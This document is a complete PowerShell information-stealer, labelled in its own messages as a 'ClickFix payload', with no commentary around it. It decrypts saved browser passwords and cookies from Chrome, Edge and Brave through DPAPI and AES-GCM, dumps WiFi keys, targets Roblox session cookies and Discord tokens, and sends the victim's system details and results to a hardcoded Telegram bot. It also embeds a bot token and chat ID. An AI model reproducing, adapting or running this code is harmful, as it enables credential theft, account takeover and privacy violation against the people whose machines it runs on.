$tgToken = "8827121220:AAHL7S675bKJdGcFlUULSUlNWOgGPfSla4U"
$tgChat = "-1003960241194"
Add-Type @"
using System; using System.Runtime.InteropServices; using System.Text;
public class N {
[DllImport("crypt32.dll")] public static extern bool CryptUnprotectData(ref D pIn, System.IntPtr a, System.IntPtr b, System.IntPtr c, System.IntPtr d, uint f, ref D pOut);
[DllImport("kernel32.dll")] public static extern System.IntPtr LocalFree(System.IntPtr h);
[DllImport("bcrypt.dll")] public static extern int BOpen(out System.IntPtr h, string a, string b, uint f);
[DllImport("bcrypt.dll")] public static extern int BClose(System.IntPtr h, uint f);
[DllImport("bcrypt.dll")] public static extern int BSetP(System.IntPtr h, string p, byte[] v, uint l, uint f);
[DllImport("bcrypt.dll")] public static extern int BGenKey(System.IntPtr ha, out System.IntPtr hk, byte[] ko, uint kol, byte[] s, uint sl, uint f);
[DllImport("bcrypt.dll")] public static extern int BDesKey(System.IntPtr h);
[DllImport("bcrypt.dll")] public static extern int BDec(System.IntPtr hk, byte[] inp, uint il, ref A ai, byte[] iv, uint ivl, byte[] op, uint ol, out uint rl, uint f);
[DllImport("bcrypt.dll")] public static extern int BGetP(System.IntPtr h, string p, byte[] o, uint ol, out uint rl, uint f);
[DllImport("winsqlite3.dll")] public static extern int sqlite3_open(string f, out System.IntPtr d);
[DllImport("winsqlite3.dll")] public static extern int sqlite3_close(System.IntPtr d);
[DllImport("winsqlite3.dll")] public static extern int sqlite3_prepare_v2(System.IntPtr d, string sql, int n, out System.IntPtr s, System.IntPtr t);
[DllImport("winsqlite3.dll")] public static extern int sqlite3_step(System.IntPtr s);
[DllImport("winsqlite3.dll")] public static extern int sqlite3_finalize(System.IntPtr s);
[DllImport("winsqlite3.dll")] public static extern System.IntPtr sqlite3_column_blob(System.IntPtr s, int c);
[DllImport("winsqlite3.dll")] public static extern int sqlite3_column_bytes(System.IntPtr s, int c);
[DllImport("winsqlite3.dll", CharSet=CharSet.Ansi) public static extern System.IntPtr sqlite3_column_text(System.IntPtr s, int c);
public struct D { public uint l; public System.IntPtr p; }
public struct A { public uint s; public uint v; public System.IntPtr n; public uint nl; public System.IntPtr ad; public uint adl; public System.IntPtr tg; public uint tl; public System.IntPtr mc; public uint mcl; public uint f; public System.IntPtr r; public uint rl; }
public static byte[] DPD(byte[] d) {
D i=new D{l=(uint)d.Length,p=System.Runtime.InteropServices.Marshal.AllocHGlobal(d.Length)};
System.Runtime.InteropServices.Marshal.Copy(d,0,i.p,d.Length); D o=new D();
bool ok=CryptUnprotectData(ref i,System.IntPtr.Zero,System.IntPtr.Zero,System.IntPtr.Zero,System.IntPtr.Zero,1,ref o);
System.Runtime.InteropServices.Marshal.FreeHGlobal(i.p);
if(!ok)return null; byte[] r=new byte[o.l];
System.Runtime.InteropServices.Marshal.Copy(o.p,r,0,(int)o.l); LocalFree(o.p); return r;
}
public static byte[] AG(byte[] k, byte[] n, byte[] c, byte[] t) {
System.IntPtr ha; int ret=BOpen(out ha,"AES",null,0); if(ret!=0)return null;
byte[] g=Encoding.ASCII.GetBytes("GCM\0"); BSetP(ha,"ChainingMode",g,4,0);
byte[] ob=new byte[4]; uint ol=0; BGetP(ha,"ObjectLength",ob,4,out ol,0);
byte[] ko=new byte[ol]; System.IntPtr hk;
ret=BGenKey(ha,out hk,ko,ol,k,(uint)k.Length,0); if(ret!=0){BClose(ha,0);return null;}
A ai=new A(); ai.s=(uint)System.Runtime.InteropServices.Marshal.SizeOf(typeof(A)); ai.v=1;
System.IntPtr np=System.Runtime.InteropServices.Marshal.AllocHGlobal(n.Length);
System.Runtime.InteropServices.Marshal.Copy(n,0,np,n.Length); ai.n=np; ai.nl=(uint)n.Length;
System.IntPtr tp=System.Runtime.InteropServices.Marshal.AllocHGlobal(t.Length);
System.Runtime.InteropServices.Marshal.Copy(t,0,tp,t.Length); ai.tg=tp; ai.tl=(uint)t.Length;
byte[] op=new byte[c.Length]; uint rl=0;
ret=BDec(hk,c,(uint)c.Length,ref ai,null,0,op,(uint)op.Length,out rl,0);
System.Runtime.InteropServices.Marshal.FreeHGlobal(np); System.Runtime.InteropServices.Marshal.FreeHGlobal(tp);
BDesKey(hk); BClose(ha,0); if(ret!=0)return null;
System.Array.Resize(ref op,(int)rl); return op;
}
}
"@
$tgBase="https://api.telegram.org/bot$tgToken"
function ts($m){$b=@{chat_id=$tgChat;text=$m;parse_mode="HTML";disable_web_page_preview=$true}|ConvertTo-Json;for($i=0;$i-lt3;$i++){try{Invoke-RestMethod -Uri "$tgBase/sendMessage" -Method Post -Body $b -ContentType "application/json" -TimeoutSec 15|Out-Null;break}catch{Start-Sleep -Seconds 3}};Start-Sleep -Milliseconds 800}
ts "[+] ClickFix payload started"
$ip=try{(Invoke-WebRequest -Uri "https://api.ipify.org" -TimeoutSec 10 -UseBasicParsing).Content}catch{"Unknown"}
$os=try{(Get-WmiObject Win32_OperatingSystem).Caption}catch{"Unknown"};$cpu=try{(Get-WmiObject Win32_Processor).Name}catch{"Unknown"}
$ram=try{[math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB,0)}catch{0}
ts "[+] System: IP: $ip | User: $env:USERNAME | PC: $env:COMPUTERNAME | OS: $os | CPU: $cpu | RAM: ${ram}GB"

$w=netsh wlan show profiles|Select-String "All User Profile"|ForEach-Object{($_-split":")[1].Trim()};$wl=@()
foreach($s in $w){$d=netsh wlan show profile name="$s" key=clear;$p=($d|Select-String "Key Content"|ForEach-Object{($_-split":")[1].Trim()});$wl+="$s : $p"}
if($wl.Count-gt0){ts "[+] WiFi: $($wl -join '; ')"}

ts "[+] Phase 2/6 - Browser data"
$ls="$env:LOCALAPPDATA\Google\Chrome\User Data\Local State";$ck=$null
if(Test-Path $ls){try{$j=Get-Content $ls -Raw|ConvertFrom-Json;$ek=$j.os_crypt.encrypted_key;if($ek){$r=[Convert]::FromBase64String($ek);$db=$r[5..($r.Length-1)];$ck=[N]::DPD($db)}}catch{}}

$pw=0;$ckn=0;$hist=0;$rob=$null
$bs=@(@("Chrome","$env:LOCALAPPDATA\Google\Chrome\User Data"),@("Edge","$env:LOCALAPPDATA\Microsoft\Edge\User Data"),@("Brave","$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"))
foreach($b in $bs){$bn=$b[0];$bp=$b[1];$pf=@("Default");if(Test-Path $bp){Get-ChildItem "$bp\Profile *" -Dir -EA 0|%{$pf+=$_.Name}}else{continue}
foreach($p in $pf){
$ld="$bp\$p\Login Data";$cd="$bp\$p\Network\Cookies";$hd="$bp\$p\History"
if(Test-Path $ld){$tmp="$env:TEMP\ld_$(Get-Random).db";Copy-Item $ld $tmp;$db=[IntPtr]::Zero;if([N]::sqlite3_open($tmp,[ref]$db)-eq0){$s=[IntPtr]::Zero;if([N]::sqlite3_prepare_v2($db,"SELECT origin_url,username_value,password_value FROM logins",-1,[ref]$s,[IntPtr]::Zero)-eq0){while([N]::sqlite3_step($s)-eq100){$ul=[N]::sqlite3_column_text($s,0);$el=[N]::sqlite3_column_bytes($s,2);$ep=[N]::sqlite3_column_blob($s,2);if($el-gt15-and$ep-ne[IntPtr]::Zero-and$ck-ne$null){$e=new-object byte[]$el;[Runtime.InteropServices.Marshal]::Copy($ep,$e,0,$el);$nn=$e[3..14];$cl=$el-31;if($cl-gt0){$ct=$e[15..(14+$cl)];$tg=$e[(15+$cl)..($el-1)];$d=[N]::AG($ck,$nn,$ct,$tg);if($d-ne$null){$pw++}}}};[N]::sqlite3_finalize($s)};[N]::sqlite3_close($db)};Remove-Item $tmp -Force -EA 0}
if(Test-Path $cd){$tmp="$env:TEMP\ck_$(Get-Random).db";Copy-Item $cd $tmp;$db=[IntPtr]::Zero;if([N]::sqlite3_open($tmp,[ref]$db)-eq0){$s=[IntPtr]::Zero;if([N]::sqlite3_prepare_v2($db,"SELECT host_key,name,encrypted_value FROM cookies",-1,[ref]$s,[IntPtr]::Zero)-eq0){while([N]::sqlite3_step($s)-eq100){$hp=[N]::sqlite3_column_text($s,0);$np=[N]::sqlite3_column_text($s,1);$el=[N]::sqlite3_column_bytes($s,2);$ep=[N]::sqlite3_column_blob($s,2);if($el-gt15-and$ep-ne[IntPtr]::Zero-and$ck-ne$null){$e=new-object byte[]$el;[Runtime.InteropServices.Marshal]::Copy($ep,$e,0,$el);$nn=$e[3..14];$cl=$el-31;if($cl-gt0){$ct=$e[15..(14+$cl)];$tg=$e[(15+$cl)..($el-1)];$d=[N]::AG($ck,$nn,$ct,$tg);if($d-ne$null){$ckn++;$cn=[Runtime.InteropServices.Marshal]::PtrToStringAnsi($np);$ch=[Runtime.InteropServices.Marshal]::PtrToStringAnsi($hp);if(($cn-eq".ROBLOSECURITY"-or$cn-eq"ROBLOSECURITY")-and$ch.Contains("roblox.com")){$rob=[System.Text.Encoding]::UTF8.GetString($d)}}}}}};[N]::sqlite3_finalize($s)};[N]::sqlite3_close($db)};Remove-Item $tmp -Force -EA 0}
if(Test-Path $hd){$tmp="$env:TEMP\h_$(Get-Random).db";Copy-Item $hd $tmp;$db=[IntPtr]::Zero;if([N]::sqlite3_open($tmp,[ref]$db)-eq0){$c=[N]::sqlite3_column_text;try{$s2=[IntPtr]::Zero;if([N]::sqlite3_prepare_v2($db,"SELECT COUNT(*) FROM urls",-1,[ref]$s2,[IntPtr]::Zero)-eq0){if([N]::sqlite3_step($s2)-eq100){$hp=[N]::sqlite3_column_text($s2,0);if($hp-ne[IntPtr]::Zero){$hist+=[int][Runtime.InteropServices.Marshal]::PtrToStringAnsi($hp)}};[N]::sqlite3_finalize($s2)}}catch{};[N]::sqlite3_close($db)};Remove-Item $tmp -Force -EA 0}
}}
ts "[+] Stolen: $pw passwords, $ckn cookies, $hist history entries"
if($rob){ts "[+] Roblox Cookie: $rob"}else{ts "[-] No Roblox cookie found"}

ts "[+] Phase 3/6 - Discord tokens"
$dd=@("$env:APPDATA\discord","$env:APPDATA\discordcanary","$env:APPDATA\discordptb","$env:APPDATA\discorddevelopment");$t=@();$rx=[regex]'[MN][A-Za-z0-9_-]{23,28}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,38}'
foreach($d in $dd){$l="$d\Local Storage\leveldb";if(Test-Path $l){Get-ChildItem $l -Include *.ldb,*.log -Recurse -File -EA 0|%{$c=try{Get-Content $_.FullName -Raw -EA 0}catch{};if($c){$rx.Matches($c)|%{if($t-notcontains$_.Value){$t+=$_.Value}}}}}}
if($t.Count-gt0){ts "[+] Discord Tokens ($($t.Count)): $($t -join '`n')"}else{ts "[-] No Discord tokens found"}

ts "[+] All phases complete"